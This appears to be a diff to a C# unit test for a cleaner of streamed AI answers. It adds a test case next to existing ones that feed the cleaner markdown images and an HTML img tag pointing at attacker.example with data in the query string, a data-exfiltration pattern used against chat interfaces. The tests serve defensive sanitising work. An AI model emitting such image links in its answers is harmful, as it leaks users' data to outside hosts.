@@ -8,6 +8,7 @@ public sealed class StreamedAnswerCleanerTests
 {
     [Theory]
     [InlineData("Rated Good ![chart](https://attacker.example/?d=1) overall.")]
+    [InlineData("![a<b](https://attacker.example/?d=secret) done.")]
     [InlineData("Done <img src=\"https://attacker.example/?d=1\"> now.")]
     [InlineData("Rated Good [Evidence 1](evidence/1) and [Evidence 2].")]
     [InlineData("See [GOV.UK](https://www.gov.uk) or [the report](files/report.pdf).")]
